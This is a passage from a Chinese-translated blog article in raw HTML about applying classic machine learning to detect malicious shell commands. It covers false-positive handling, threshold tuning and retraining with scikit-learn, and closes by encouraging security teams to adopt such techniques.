translated">一旦模型被部署并加入到您的检测中，您将会看到误报。因此，我们建议调整恶意阈值，以匹配所需的警报级别(更高的阈值，更少的警报，但更多的假阴性)。</p><p id="0d86" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">然而，这个模型可以而且应该被<strong class="lt iu">重新训练</strong>来避免这些错误。<em class="ms">一种方法</em>是用具有正确标签的新示例更新初始训练数据集，并从头开始重新训练模型。<em class="ms">第二种</em>方式是利用<a class="ae nq" href="https://en.m.wikipedia.org/wiki/Online_machine_learning" rel="noopener ugc nofollow" target="_blank">在线学习</a>技术，从数据流中更新模型。一些模型实现了<code class="fe mt mu mv mw b">partial_fit()</code>，并允许在新数据进来时更新模型行为。关于该主题，请参考<a class="ae nq" href="https://scikit-learn.org/stable/computing/scaling_strategies.html" rel="noopener ugc nofollow" target="_blank"> sklearn文档</a>。对于这些需求，我们建议使用在<code class="fe mt mu mv mw b">sklearn</code>—<a class="ae nq" href="https://scikit-learn.org/stable/modules/generated/sklearn.neural_network.MLPClassifier.html" rel="noopener ugc nofollow" target="_blank">MLP分类器</a>中实现的基本神经网络来代替<code class="fe mt mu mv mw b">XGBClassifier</code>(MLP或<strong class="lt iu">M</strong>ulti-<strong class="lt iu">L</strong>layered<strong class="lt iu">P</strong>er ception是机器学习的一个老式名称)。</p><p id="7037" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">例如，考虑到假阳性的发生，在这些情况下，模型可能仅在特定命令上被重新训练:</p><figure class="kk kl km kn gt ko"><div class="bz fp l di"><div class="ny nz l"/></div></figure><h1 id="385d" class="kz la it bd lb lc ld le lf lg lh li lj jz lk ka ll kc lm kd ln kf lo kg lp lq bi translated">结论</h1><p id="92a5" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated">虽然高级人工智能已经极大地改变了自然语言处理(NLP)或计算机视觉(CV)应用程序，但我们正在慢慢采用这些技术来满足网络安全需求。虽然该行业在某些方向取得了显著的成果，如从可移植可执行(PE)文件中进行恶意软件分类，或者出现了一些好的文献(例如，从<a class="nw nx ep" href="https://medium.com/u/74ad66811b78?source=post_page-----73d7196995c7--------------------------------" rel="noopener" target="_blank">威尔·施罗德</a>T2开始的一系列出版物)，但是使用ML技术进行以安全为重点的行为分析的资料仍然很少。</p><p id="a097" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">正如本文所示，无需实施昂贵的深度学习解决方案和在R&amp;D上大量投资，只需使用本主题中讨论的传统技术，就可以实现显著的改进。通过对特定信息安全问题的聪明的、选择性的应用，即使简单的ML技术也能在安全工程师和分析师的日常操作中产生显著的改进。</p><p id="4a02" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">我们希望本出版物中分享的信息将激励安全爱好者尝试ML技术来解决他们的任务，从而最大限度地缩小数据科学和信息安全之间的差距。Infosec还需要克服一个<strong class="lt iu">适用性缺口</strong>，用数据科学界在过去十年中揭示的宏伟技术来增强该领域的能力。本文范围内所做的所有实验，都可以在这个<a class="ae nq" href="https://github.com/dtrizna/slp/blob/main/examples/tutorial_classification_and_anomaly_detection.ipynb" rel="noopener ugc nofollow" target="_blank">笔记本</a>里找到。</p></div></div>    
</body>
</html>